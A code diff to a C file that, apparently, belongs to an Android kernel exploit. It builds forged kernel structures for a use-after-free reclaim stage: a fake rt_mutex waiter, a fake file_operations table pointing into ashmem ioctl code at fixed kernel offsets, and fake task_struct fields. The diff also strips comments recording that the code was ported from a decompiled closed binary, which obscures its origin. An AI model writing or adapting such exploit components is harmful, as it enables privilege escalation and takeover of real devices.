@@ -1,7 +1,9 @@
-/* source: FUN_00106288 (param_1==0 branch, "install fake ashmem_misc_fops"
- * path) + FUN_001061ac (fake rt_mutex_waiter builder). Straight port of
- * the byte layout, verified field-by-field against the decompile this
- * session -- see 04_fake_kernel_objects.h for the derivation. */
+/*
+ * Builds the in-memory object layout used by the reclaim stage. Writes a fake
+ * lock, PI waiter, file_operations table, task fields, and red-black-tree
+ * nodes into one buffer.
+ */
+
 #include <string.h>
 
 #include "04_fake_kernel_objects.h"
@@ -14,7 +16,6 @@ static void put32(unsigned char *base, size_t off, uint32_t value) {
   memcpy(base + off, &value, sizeof(value));
 }
 
-/* source: FUN_001061ac @ 0x0010a1ac. w0 = waiter offset (0x2350). */
 static void put_fake_waiter(unsigned char *scratch, size_t w0,
                              uint64_t pi_parent, uint64_t pi_right,
                              uint64_t pi_left, uint64_t task, uint64_t lock,
@@ -33,13 +34,6 @@ static void put_fake_waiter(unsigned char *scratch, size_t w0,
   put64(scratch, w0 + 0x50, 0);           /* ww_ctx */
 }
 
-/* source: FUN_00106288, fake file_operations table (FOPS_OFF=0x2000),
- * param_1==0 branch only. Every *_OFF constant here matches
- * targets/afzh3/reference/kernel/legacy-target/target.h exactly (double-checked this
- * session against both the decompile and the raw delta arithmetic --
- * e.g. ASHMEM_COMPAT_IOCTL_OFF - ASHMEM_IOCTL_OFF == 0x65c, the exact
- * delta the closed binary adds to its already-resolved ASHMEM_IOCTL
- * value instead of re-resolving from kernel_base). */
 static void put_fake_fops(unsigned char *scratch, uint64_t kernel_base,
                            uint64_t self_ref, size_t table_base) {
   uint64_t ashmem_ioctl = kernel_base + 0x0114c6dcULL;
@@ -61,8 +55,6 @@ static void put_fake_fops(unsigned char *scratch, uint64_t kernel_base,
   put64(scratch, table_base + 0xe0, ashmem_ioctl + 0xb48ULL); /* FOPS_SHOW_FDINFO_OFF */
 }
 
-/* source: FUN_00106288, fake task_struct (FAKE_TASK_OFF=0x3200). Offsets
- * match target.h's FAKE_TASK_* constants exactly. */
 static void put_fake_task(unsigned char *scratch, uint64_t self_ref,
                            uint64_t root_task_group, uint64_t init_task_addr) {
   put32(scratch, 0x3200 + 0x38, 0x100);  /* FAKE_TASK_USAGE_OFF */
